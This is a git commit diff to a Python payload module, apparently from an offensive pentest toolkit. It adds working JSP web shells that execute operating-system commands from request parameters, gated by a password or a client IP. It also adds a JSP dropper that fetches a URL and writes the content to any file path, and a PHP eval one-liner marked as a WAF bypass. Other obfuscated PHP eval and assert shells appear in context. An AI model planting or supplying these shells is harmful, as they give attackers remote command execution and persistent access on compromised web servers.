fb21ad4c05637978c9b0bc709b0c8168705a9ace
lyle <lilyui@126.com>
2018-11-09 21:48:37 +0800

    update web shell

--- saker/payloads/shell.py
+++ saker/payloads/shell.py
@@ -19,6 +19,51 @@ while (1) {
 }
 '''
 
+jspShellWithPwd = '''
+<%
+if("%s".equals(request.getParameter("pwd")))
+{
+    java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print("<pre>");
+    while((a=in.read(b))!=-1)
+    {
+        out.println(new String(b));
+    }
+    out.print("</pre>");
+}
+%>
+'''
+
+jspShellWithIP = '''
+<%
+if(request.getRemoteAddr().equals("%s"))
+{
+    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    while((a=in.read(b))!=-1)
+    {
+        out.println(new String(b));
+    }
+}
+%>
+'''
+
+jspWriteFile = '''
+<%
+    java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();
+    byte[] b = new byte[1024];
+    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+    int a = -1;
+    while ((a = in.read(b)) != -1) {
+        baos.write(b, 0, a);
+    }
+    new java.io.FileOutputStream(request.getParameter("f")).write(baos.toByteArray());
+%>
+'''
+
 # when can not upload php but can upload .htaccess
 # and allow rewrite use this one
 htaccessRewrite = '''
@@ -41,13 +86,20 @@ class Shell(object):
             "<?php @eval($GLOBALS['_POST']['%s']);?>",
             # "<?php @eval($_FILE['name']);?>",
             '$k="ass"."ert"; $k(${"_PO"."ST"} ["%s"]);',
+            # waf bypass
+            '<?php ($_=@$_GET[2]).@$_($_POST[1])?>'
         ]
 
     def basic(self, pwd="a"):
         if self.stype == "php":
             return random.choice(self.phpShells) % pwd
-        if self.stype == "bash":
+        elif self.stype == "jsp":
+            return jspShellWithPwd % pwd
+        elif self.stype == "bash":
             return "not implement yet"
+
+    def ipLimit(self, ip="127.0.0.1"):
+        return jspShellWithIP % ip
 
     def memoryShell(self, shellname=".config.php", pwd="a"):
         return memoryShellPHP % (shellname, pwd)
